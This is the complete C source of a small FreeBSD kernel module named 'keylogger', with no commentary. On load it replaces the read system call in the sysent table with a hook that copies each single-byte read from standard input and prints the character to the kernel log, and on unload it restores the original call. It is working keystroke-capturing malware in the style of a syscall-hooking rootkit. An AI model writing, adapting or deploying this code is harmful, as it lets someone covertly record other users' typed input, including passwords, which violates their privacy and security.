#include <sys/param.h>
#include <sys/types.h>
#include <sys/systm.h>
#include <sys/kernel.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/syscall.h>
#include <sys/sysproto.h>

static int
read_hook(struct thread *td, struct read_args *args)
{
	struct read_args *uap = (struct read_args *) args;
	int result = sys_read(td, args);

	if (uap->fd == 0 && uap->nbyte == 1) {
		// if reading from stdin
		char buffer[uap->nbyte];
		copyinstr(uap->buf, buffer, uap->nbyte, NULL);
		printf("%c\n", buffer[0]);
	}

	return result;
}

static int
load(struct module *module, int cmd, void *arg)
{
	switch(cmd) {
		case MOD_LOAD:
			sysent[SYS_read].sy_call = (sy_call_t *) read_hook;
			break;
		case MOD_UNLOAD:
			sysent[SYS_read].sy_call = (sy_call_t *) sys_read;
			break;
		default:
			return EOPNOTSUPP;
	}

	return 0;
}

static moduledata_t mod_keylogger = {
	"keylogger",
	load,
	NULL
};

DECLARE_MODULE(keylogger, mod_keylogger, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
